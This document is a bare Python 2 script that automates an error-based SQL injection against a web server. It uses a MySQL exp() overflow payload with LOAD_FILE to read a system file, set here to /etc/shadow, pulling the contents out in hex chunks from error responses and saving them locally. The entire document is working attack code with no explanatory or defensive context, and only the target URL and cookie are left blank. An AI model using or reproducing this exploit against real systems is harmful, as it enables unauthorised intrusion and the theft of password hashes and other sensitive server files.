# !/usr/bin/env python
# -*- coding: utf-8 -*-
import requests

path = ""
path = "/etc/shadow"

baseurl = ""

url = baseurl + "') and exp(~(select*from(select mid(hex(LOAD_FILE('{path}')),{num1},{num2}))x))-- -".format(path=path,num1="{num1}",num2="{num2}",)

lurl = baseurl + "') and exp(~(select*from(select length(LOAD_FILE('{path}')))x))-- -".format(path=path)

headers = {'User-Agent':'Accounts/113 CFNetwork/711.1.16 Darwin/14.0.0',
'Cookie':'',
}

r = requests.get(lurl, headers=headers)
res = r.content
num = res[1117:res.find("from dual")-2]

data = ""
a = 0
while a < int(num):
    u = url.format(num1=a+1,num2=a+462)
    data += requests.get(u, headers=headers).content[1117:1577]
    print data.decode("hex")
    a+=462

name = ""
f = open("a/" + name, "w")
f.write(data.decode("hex"))